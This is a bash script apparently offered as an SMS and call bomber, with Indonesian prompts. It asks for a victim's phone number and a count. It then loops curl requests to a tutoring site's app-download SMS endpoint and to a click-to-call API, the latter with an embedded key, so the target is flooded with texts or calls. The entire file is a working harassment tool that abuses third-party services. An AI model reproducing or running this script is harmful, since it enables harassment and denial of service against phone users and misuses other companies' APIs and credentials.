#!/bin/bash

clear

NC='\033[0m'          
Black='\033[0;30m'       
Red='\033[0;31m'         
Green='\033[1;32m'       
Yellow='\033[1;33m'      
Blue='\033[0;34m'     
Purple='\033[0;35m'       
Cyan='\033[1;36m'      
White='\033[0;37m'    
BGreen='\033[1;32m'     
BRed='\033[1;31m'


echo -e "${Cyan}+-------------------------------------------------------------------+${NC}"
echo -e "${Cyan}|${NC}                      ${BGreen}[${NC}${BRed}          AVINDESO${NC}${BGreen}]${NC}                    ${Cyan}|${NC}"
echo -e "${Cyan}|${NC}                                                                   ${Cyan}|${NC}"
echo -e "${Cyan}|${NC}                                            | ${NC}${Yellow}Coder:${NC}${BGreen} Suvadip Kar${NC}${NC} | ${NC}${Cyan}|${NC}"
echo -e "${Cyan}|${NC}                                            | ${Yellow}Version:${NC} ${BGreen}1.0${NC}       | ${Cyan}|${NC}"
echo -e "${Cyan}+-${NC}${Green}[ Enter Your Choice ]${Cyan}---------------------------------------------${Cyan}+${NC}"
echo -e "${Yellow}1. ${NC}Prank Nelpon"
echo -e "${Yellow}2. ${NC}Prank Nelpon\n"

read -p '[>>>]' pinu
smsbomb(){
	curl -A "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5" -s https://www.toppr.com/api/download-app/ -d phone=$no >> /dev/null
}

callbomb(){
	curl -A "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5" -s "http://ex1.zeotel.com/c2c?key=aQVblBv5h18xhjLNAwZqrQ-1403256058&ac=14945&ph=$no" >>/dev/null
}


if [ $pinu == 1 ]; then
	echo "Nomor korban sms"
	read -p '[>>>]' no
	echo "Berapa sms kali"
	read -p '[>>>]' msg
	 	for x in `seq 1 $msg`; do
	 		smsbomb
	 		echo "sms $x Kirim"
	 	done

elif [ $pinu == 2 ]; then
	echo "Nomor korban PranK"
	read -p '[>>>]' no
	echo "Berapa x nelpon"
	read -p '[>>>]' cal
		 for x in `seq 1 $cal`; do
		 	callbomb 
		 	echo "Nelpon $x dalam proses"
		 	sleep 2
		 done
else 
	echo -e "${Yellow}You Choosed A Wrong One${NC}"

fi
